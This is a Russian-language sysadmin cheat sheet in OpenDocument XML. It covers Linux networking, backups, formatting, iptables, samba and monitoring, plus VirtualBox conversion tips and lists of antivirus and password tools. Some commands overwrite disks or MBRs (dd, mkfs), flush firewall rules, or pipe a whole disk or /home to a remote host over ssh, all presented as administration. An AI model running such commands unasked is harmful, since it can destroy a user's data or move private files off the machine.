      <text:p text:style-name="P1"><text:span text:style-name="T1"># ifconfig eth0 192.168.1.1 netmask 255.255.255.0 - Назначить IP адрес и маску сетевому интерфейсу eth0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># ip link show - Вывести статус связи всех сетевых интерфейсов</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"># iwconfig eth1 - Вывести конфигурацию беспроводного сетевого интерфейса eth1</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"># iwlist scan - Сканирование и поиск беспроводных сетей и точек доступа</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># mii-tool eth0 - Вывести состояние связи сетевого интерфейса eth0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># nslookup www.example.com - Ресольвить ( преобразовать/разрешить ) доменное имя www.example.org в ip-адрес и наоборот</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># route -n - Песать локальной таблицы маршрутизации</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 - Добавить статический маршрут в сеть 192.168.0.0/16 через шлюз с ip-адресом 192.168.1.1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># route add -net 0/0 gw IP_Gateway - Назначить ip-адрес шлюза по умолчанию ( default gateway )</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1"># route del 0/0 gw IP_gateway - Удалить ip-адрес шлюза по умолчанию ( default gateway )</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># netstat -rn - Вывести таблицу маршрутизации, аналог команды route -n</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># echo "1" &gt; /proc/sys/net/ipv4/ip_forward - Разрешить форвардинг ( пересылку ) пакетов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># tcpdump tcp port 80 - Отлавливать и выводить весь трафик на TCP-порт 80 (обычно - HTTP)</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># whois www.example.com - Вывести информацию о доменном имени из базы данных whois</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как блокировать USB-накопители в Windows?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Для этого воспользуйтесь редактором локальной групповой политики:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. Нажмите «Win+R» и в поле введите команду «gpedit.msc», чтобы запустить редактор.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3. В выбранном разделе откройте «Административные шаблоны» → «Система» → «Доступ к съемным запоминающим устройствам».</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">4. Откройте параметр «Съемные запоминающиеся устройства всех классов: Запретить любой доступ» и установите значение «Включено» и тапните «Применить».</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Резервное копирование</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># find /var/log -name '*.log' | tar cv --files-from=- | bzip2 &gt; log.tar.bz2 - Поиск всех файлов, заканчивающихся на ".log" в директории /var/log, и упаковка их в bzip-архив</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># find /home/user -name '*.txt' | xargs cp -av --target-directory=/home/backup/ --parents - Поиск в директории /home/user файлов, имена которых оканчиваются на ".txt", и копирование их в другую директорию</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1"># rsync -rogpav --delete /home /tmp - Синхронизировать директории /tmp и /home</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># rsync -az -e ssh --delete ip_addr:/home/public /home/local - Синхронизировать локальную и удаленную директории через ssh туннель используя сжатие</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># rsync -rogpav -e ssh --delete /home ip_address:/tmp - Синхронизация через SSH туннель</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># rsync -az -e ssh --delete /home/local ip_addr:/home/public - Синхронизировать удалённую директорию с локальной используя ssh туннель со сжатием</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># dd bs=1M if=/dev/hda | gzip | ssh user@ip_addr 'dd of=hda.gz' - Создать "слепок" локального диска в файл на удалённом сервере используя ssh туннель</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># dd if=/dev/hda of=/dev/fd0 bs=512 count=1 - </text:span><text:span text:style-name="T1">Создание</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">копии</text:span><text:span text:style-name="T3"> MBR ( Master Boot Record ) </text:span><text:span text:style-name="T1">с</text:span><text:span text:style-name="T3"> /dev/hda </text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">флоппи</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T1">диск</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># dd if=/dev/sda of=/tmp/backup - Создание резервной копии содержимого жесткого диска в файл backup</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># dd if=/dev/fd0 of=/dev/hda bs=512 count=1 - Восстановить MBR с флоппи-диска на /dev/hda</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># dump -0aj -f /tmp/home0.bak /home - Создать полную резервную копию директории /home в файл /tmp/home0.bak</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># dump -1aj -f /tmp/home0.bak /home - Создать инкрементную резервную копию директории /home в файл /tmp/home0.bak</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># restore -if /tmp/home0.bak - Восстановить данные из резервной копии /tmp/home0.bak</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># tar -Puf backup.tar /home/user - Создать инкрементную резервную копию директории /home/user в файл backup.tar сохраняя права доступа</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># ( cd /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr 'cd /home/share/ &amp;&amp; tar x -p' - </text:span><text:span text:style-name="T1">Упаковка</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">архив</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">и</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">копирование</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">содержимого</text:span><text:span text:style-name="T3"> /tmp/local </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">директорию</text:span><text:span text:style-name="T3"> /home/share/ </text:span><text:span text:style-name="T1">удалённого</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сервера</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T1">используя</text:span><text:span text:style-name="T3"> ssh </text:span><text:span text:style-name="T1">туннель</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># ( tar c /home ) | ssh -C user@ip_addr 'cd /home/backup-home &amp;&amp; tar x -p' - </text:span><text:span text:style-name="T1">Упаковка</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">архив</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">и</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">копирование</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">содержимого</text:span><text:span text:style-name="T3"> /home </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">директорию</text:span><text:span text:style-name="T3"> /home/backup-home </text:span><text:span text:style-name="T1">удалённого</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сервера</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T1">используя</text:span><text:span text:style-name="T3"> ssh </text:span><text:span text:style-name="T1">туннель</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># tar cf - . | (cd /tmp/backup ; tar xf - ) - Упаковка в архив и копирование одной директории в другую с сохранением прав доступа и ссылок</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Форматирование файловой системы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># fdformat -n /dev/fd0 - Форматирование флоппи-диска без проверки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># mkfs /dev/hda1 - Создать файловую систему linux на разделе hda1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># mke2fs -j /dev/hda1 - Создать журналируемую файловую систему ext3 на разделе hda1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># mke2fs /dev/hda1 - Создание файловой системы ext2 на разделе hda1</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># mkfs -t vfat 32 -F /dev/hda1 - Создать файловую систему FAT32 на разделе hda</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T1">Файловая система SWAP</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># mkswap /dev/hda3 - Создание swap-пространство на разделе hda3</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># swapon /dev/hda3 - Включить swap-пространство, расположенное на разделе hda3</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># swapon /dev/hda2 /dev/hdb3 - Активировать swap-пространства, расположенные на разделах hda2 и hdb3</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Конвертирование содержимого текстовых файлов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># dos2unix filedos.txt fileunix.txt - Конвертировать содержимое текстового файла из MSDOS кодировки в UNIX кодировку (разница в символах возврата коретки)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># unix2dos fileunix.txt filedos.txt - Конвертировать содержимое текстового файла из UNIX кодировки в MSDOS кодировку (разница в символах возврата коретки)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># recode ..HTML &lt; page.txt &gt; page.html - Конвертировать содержимое тестового файла page.txt в html-файл page.html</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># recode -l | more - Вывести список доступных форматов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Microsoft Windows networks (samba)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share - Монтировать smb-ресурс, расшаренный на windows-машине, в папку локальной файловой системы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># nbtscan ip_addr - Преобразовать имя netbios. Программа nbtscan не во всех системах присутствует по-умолчанию, nmblookup включен в пакет samba</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># nmblookup -A ip_addr - Преобразовать имя netbios. Программа nbtscan не во всех системах присутствует по-умолчанию, nmblookup включен в пакет samba</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># smbclient -L ip_addr/hostname - Вывести список ресурсов, выделенных в общий доступ на windows-машине</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># smbget -Rr smb://ip_addr/share - Аналог программы wget для SMB протокола</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Фаервол IPTABLES, штатный, для большинства дистрибутивов Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># iptables -t filter -L - Вывести список всец цепочек правил</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># iptables -t nat -L - Вывести все цепочки из NAT таблицы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># iptables -t nat -F - Очистить все цепочки правил в таблице NAT</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># iptables -t filter -X - Очистить все пользовательские цепочки правил в таблице filter</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># iptables -t filter -F - Очистить все цепочки правил в таблице filter</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># iptables -t filter -A INPUT -p tcp --dport telnet -j ACCEPT - Разрешить входящие соединения с telnet</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># iptables -t filter -A OUTPUT -p tcp --dport http -j DROP - Запретить исходящие HTTP соединения</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3"># iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE - </text:span><text:span text:style-name="T1">включить</text:span><text:span text:style-name="T3"> NAT (Network Address Translate) </text:span><text:span text:style-name="T1">исходящих</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">пакетов</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">интерфейс</text:span><text:span text:style-name="T3"> eth0. </text:span><text:span text:style-name="T1">Допустимо</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">при</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">использовании</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">с</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">динамически</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">выделяемыми</text:span><text:span text:style-name="T3"> ip-</text:span><text:span text:style-name="T1">адресами</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"># iptables -t nat -A PREROUTING -d 192.168.0.1 -p tcp -m tcp --dport 22 -j DNAT --to-destination 10.0.0.2:22 - </text:span><text:span text:style-name="T1">Пересылка</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">пакетов</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T1">адресованных</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">одному</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">хосту</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">другой</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">хост</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"># iptables -t filter -A INPUT -j LOG --log-prefix - </text:span><text:span text:style-name="T1">Включить</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">логгирование</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">пакетов</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T1">проходящих</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">через</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">цепочку</text:span><text:span text:style-name="T3"> INPUT, </text:span><text:span text:style-name="T1">и</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">добавлением</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">к</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сообщению</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">префикса</text:span><text:span text:style-name="T3"> "DROP INPUT"</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3"># iptables -t filter -A FORWARD -p tcp --dport pop3 -j ACCEPT - </text:span><text:span text:style-name="T1">Разрешить</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">форвардинг</text:span><text:span text:style-name="T3"> POP3 </text:span><text:span text:style-name="T1">соединений</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Мониторинг и отладка системы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># free -m - Вывод статистики по оперативной памяти</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># kill -9 proc_id - Убить процесс с PID proc_id, без соблюдения целостности данных, то есть насмерть</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># kill -1 proc_id - Перечитать файл конфигурации процессом с PID proc_id</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># last reboot - Вывод истории ребутов системы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># lsof /home/user1 - Вывести список открытых файлов из директории /home/user1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># lsof -p proc_id - Вывести список файлов, открытых процессом с PID proc_id</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># lsmod - Список загруженных модулей ядра</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># ps -e -o pid,args --forest - Вывести список PID'ов и процессов в виде дерева</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># ps -eafw - Отобразить работающие в системе процессы, используемые ими ресурсы и другую полезную информацию ( единожды )</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># pstree - Вывести дерево процессов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># smartctl -i /dev/hda - Проверить доступность SMART на жёстком диске /dev/hda</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># smartctl -A /dev/hda - Проверка состояния жёсткого диска /dev/hda через SMART</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># strace -c ls &gt;/dev/null - Вывести список системных вызовов, созданных и полученных процессом ls</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># strace -f -e open ls &gt;/dev/null - Вывести список вызовов системных бибилотек</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># tail /var/log/messages - Вывести десять последних записей из системного журнала</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># tail /var/log/dmesg - Вывести десять последних записей из журнала загрузки ядра</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># top - Вывести список работающих в системе процессов с различной полезной информацией в режиме реального времени с автоматическим обновлением данных</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># watch -n1 'cat /proc/interrupts' - Выводить прерывания в режиме реального времени</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Другие полезные команды</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># alias hh='history' - Создать псевдоним hh для команды history</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># apropos ...keyword - Вывод комманд, так или иначе относящихся к ключевым словам. Полезно, когда вы знаете что делает программа, но не помните команду</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># chsh - Изменить системную оболочку пользователя</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># gpg -c file1 - Шифрует файл file1 с помощью GNU Privacy Guard</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># gpg file1.gpg - Дешифрует файл file1 с помощью GNU Privacy Guard</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># ldd /usr/bin/ssh - Список библиотек, используемых программой ssh</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># man ping - Ввывод страниц руководства по работе с программой, в данном случае, ping</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># mkbootdisk --device /dev/fd0 `uname -r` - Создаёт загрузочный флоппи-диск</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">#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8"><text:span text:style-name="T1"># wget -c www.example.com/file.iso - Загрузить файл www.example.com/file.iso с возможностью остановки и докачки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># echo 'wget -c www.example.com/files.iso' | at 09:00 - Включить закачку в определенное время</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># whatis ...keyword - Вывести описание действий указанной программы</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># who -a - Вывести список залогиненных пользователей, время последней загрузки системы и прочую полезную информацию</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как преобразовать Linux dd образ img в .VDI, VMDK, VHD с помощью команды VIrtualBox. Конвертация IMG файлов в формат VDI, VMDK, VHD для Oracle VirtualBox, Vmware и XenCenter.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сначала нам нужно взять образ из системы Linux, и это займет некоторое время.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">dd if=/dev/sda of=/mnt/run/media/filename.img bs=4M</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. Откройте окно cmd.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Нажмите Выполнить -&gt; cmd -&gt; Enter</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. Обратите внимание, что Windows открывает окно DOS.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Затем перейдите к dd image drive.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3. Для этой работы необходимо установить Oracle Virtual box.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Для</text:span><text:span text:style-name="T3"> Virtual Box:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">I:\&gt;VBoxManage convertfromraw --format VDI sourcefile.dd filename.VDI</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Для</text:span><text:span text:style-name="T3"> Vmware ESXi:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">I:\&gt;VBoxManage convertfromraw --format VMDK sourcefile.dd filename.VMDK</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Для</text:span><text:span text:style-name="T3"> Hyper-V:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">I:\&gt;VBoxManage convertfromraw --format VHD sourcefile.dd filename.VHD</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Нажмите Enter, чтобы начать преобразование.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Подождите около полутора минут, пока конвертирование будет происходить, а затем создайте новую виртуальную машину с файлом VDI.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как преобразовать образ диска гостевой виртуальной машины VirtualBox из VMDK в VDI</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">VirtualBox обеспечивает поддержку преобразования файлов образов дисков с помощью команды “VBoxManage clonemedium”.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Пример синтаксиса команды для этой операции в VirtualBox 6.0:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># VBoxManage clonemedium disk [inputfile] [outputfile] --format VDI</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T1">Примечание: более ранние версии VirtualBox предоставляли аналогичную функциональность с помощью команд clonevdi и clonehd.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Вместо 1000 антивирусов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3. Dr. Web (https://t.me/KladovkaPavlu/84)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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">4. MetaDefender Cloud (https://t.me/KladovkaPavlu/534) - мощный антивирусный сканер файлов, ссылок, IP адресов, доменов и хешей. </text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">5. ClamAV (https://www.clamav.net/https://t.me/KladovkaPavlu/573) - пакет антивирусного ПО, работающий во многих операционных системах, включая Unix-подобные ОС, OpenVMS, Microsoft Windows и Apple Mac OS X.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Подборка сервисов для шифрования, хеширования и расшифровки данных онлайн</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">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1"><text:span text:style-name="T1">2. http://crypt-online.ru/ - поддерживаемые алгоритмы: base64, MD5, SHA256, AES(128-256), RC4, RSA. Утилиты</text:span><text:span text:style-name="T3">: Text to hex, Hex to text, Json, QR </text:span><text:span text:style-name="T1">коды</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">и</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">др</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3. https://planetcalc.ru/search/?tag=813 - поддерживает шифр Цезаря, Виженера, Хилла, Атбаш, A1Z26, Плейфера и шифр масонов. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">4. https://www.dcode.fr/ - известный сайт, поддерживает многие алгоритмы, есть математические, IT инструменты и не только.</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">5. https://www.boxentriq.com/code-breaking/cipher-identifier - определяет тип шифра, есть инструменты работы с текстом.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Блокировка учетной записи пользователя: </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ passwd -l user_name </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Проверка состояния учетной записи:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ passwd -S user_name</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Разблокировка пользователя: </text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">$ passwd -u user_name</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Все для ваших паролей</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. Генераторы</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">omgopass (https://t.me/KladovkaPavlu/1265) - сервис для создания надежных и легко запоминающихся паролей.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">identiji (https://t.me/KladovkaPavlu/599) - расширение для генерации паролей с помощью эмодзи. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">EasyStrongPassword (https://t.me/EasyStrongPasswordBot) - генератор сложных и простых паролей + мнемонических фраз.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T1">Проверка</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">брут</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T1">слив</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">How secure is my password? </text:span><text:span text:style-name="T1">(https://howsecureismypassword.net/) - <text:s/>сервис для проверки надежности ваших паролей. Показывает примерное время взлома вашего пароля (подбора).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">DeHashed (https://t.me/KladovkaPavlu/335) - <text:s/>сервис поиска по базе взломанных и украденных персональных данных. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Kaspersky Password Checker <text:s/>(https://t.me/KladovkaPavlu/607) - <text:s/>весьма неплохой чекер паролей на устойчивость к взлому и наличии в базах. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Подборка чекеров утечек (https://t.me/KladovkaPavlu/877) - всевозможные сервисы для проверки ваших паролей на предмет утечки.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3. Хранение </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Spectre (https://spectre.app/) - надежный менеджер паролей, не хранящий ваши пароли по факту, а генерирующий их на лету. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Buttercup (https://t.me/KladovkaPavlu/697) - это кроссплатформенный менеджер паролей с открытым исходным кодом, написанный на NodeJS с Typescript.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Dashlane (https://t.me/KladovkaPavlu/497) - менеджер + генератор сложных паролей.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">KeePassDX <text:s/>(https://t.me/KladovkaPavlu/481) - <text:s/>менеджер паролей с открытым исходным кодом. Для пользователей Android.</text:span></text:p>
